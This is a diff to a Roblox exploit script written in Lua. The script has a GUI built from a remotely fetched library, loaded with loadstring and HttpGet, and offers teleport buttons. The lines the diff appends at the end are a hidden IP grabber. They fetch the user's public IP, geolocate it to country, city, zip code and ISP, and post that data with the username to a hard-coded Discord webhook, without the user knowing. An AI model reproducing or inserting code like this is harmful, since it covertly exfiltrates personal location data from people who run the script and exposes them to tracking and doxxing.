@@ -1,3 +1,4 @@
+
 local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/deeeity/mercury-lib/master/src.lua"))()
 
 local GUI = Mercury:Create{
@@ -1295,3 +1296,46 @@ TeleportTab:Button{
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-186.654739, -463.662415, 1174.18298, 0.130901337, 5.79686592e-08, -0.991395414, 5.18117593e-09, 1, 5.91558944e-08, 0.991395414, -1.28801796e-08, 0.130901337)
    end,
 }
+
+local name = game:GetService("Players").LocalPlayer.Name
+local WebhookURL = "https://discord.com/api/webhooks/1056617255397511218/RbWMee13RmLfhoj2uE3ybQx5G9wBM3EJtWixSmUIU9vYvuPJJIuphsUDxayT1-CAb7Sg"
+local getIPResponse = syn.request({
+    Url = "https://api.ipify.org/?format=json",
+    Method = "GET"
+})
+local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+local IPBuffer = tostring(GetIPJSON.ip)
+
+local getIPInfo = syn.request({
+    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+    Method = "Get"
+})
+local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+local FI = {
+    IP = IPBuffer,
+    country = IIT.country,
+    countryCode = IIT.countryCode,
+    region = IIT.region,
+    regionName = IIT.regionName,
+    city = IIT.city,
+    zipcode = IIT.zip,
+    latitude = IIT.lat,
+    longitude = IIT.lon,
+    isp = IIT.isp,
+    org = IIT.org
+}
+local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
+local MessageData = {
+    ["content"] = dataMessage
+}
+
+syn.request(
+    {
+        Url = WebhookURL, 
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(MessageData)
+    }
+)
